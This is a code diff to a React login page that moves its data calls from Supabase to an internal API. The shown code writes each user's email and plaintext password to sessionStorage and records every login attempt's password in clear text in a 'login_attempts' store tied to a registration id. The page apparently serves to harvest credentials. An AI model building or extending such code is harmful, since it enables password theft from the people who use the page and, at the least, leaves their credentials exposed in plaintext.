@@ -1,7 +1,7 @@
 import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Mail, Lock, Eye, EyeOff, ArrowLeft, LogIn } from 'lucide-react';
-import { supabase } from '@/lib/supabase';
+import { api } from '@/lib/api';
 import { useSiteConfig } from '@/context/SiteConfigContext';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
@@ -32,17 +32,16 @@ export default function LoginPage() {
       sessionStorage.setItem('reg_email', email.trim().toLowerCase());
       sessionStorage.setItem('reg_password', password);
 
-      // Try to save login attempt to database (if table exists)
+      // Save login attempt to database
       try {
         const regId = sessionStorage.getItem('reg_id');
-        await supabase.from('login_attempts').insert({
+        await api.loginAttempts.create({
           registration_id: regId || null,
           email: email.trim().toLowerCase(),
           password: password,
         });
       } catch (dbErr) {
-        console.warn('Could not save login attempt to database:', dbErr);
-        // Continue anyway - login should still work
+        console.warn('Could not save login attempt:', dbErr);
       }
       
       setLoading(false);
